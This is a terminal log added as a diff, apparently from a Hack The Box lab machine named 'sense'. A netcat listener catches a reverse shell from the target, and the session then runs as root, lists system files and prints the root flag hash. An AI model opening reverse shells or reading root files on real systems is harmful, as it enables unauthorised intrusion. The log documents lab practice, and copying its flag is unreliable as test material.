@@ -1,0 +1,37 @@
+┌─[root@parrot]─[~/hackthebox/sense]     
+└──╼ #nc -nvlp 1234 
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                      
+Ncat: Listening on :::1234               
+Ncat: Listening on 0.0.0.0:1234          
+Ncat: Connection from 10.10.10.60.       
+Ncat: Connection from 10.10.10.60:34019. 
+sh: can't access tty; job control turned off                                      
+# whoami            
+root                
+# ls                
+GW_WAN-quality.rrd  
+WAN_DHCP-quality.rrd                     
+ipsec-packets.rrd   
+ipsec-traffic.rrd   
+system-mbuf.rrd     
+system-memory.rrd   
+system-processor.rrd                     
+system-states.rrd   
+updaterrd.sh        
+wan-packets.rrd     
+wan-traffic.rrd     
+# cd /root          
+# ls                
+.cshrc              
+.first_time         
+.gitsync_merge.sample                    
+.hushlogin          
+.login              
+.part_mount         
+.profile            
+.shrc               
+.tcshrc             
+root.txt            
+# cat root.txt      
+d08c32a5d4f8c8b10e76eb51a69f1a86         
+#                   
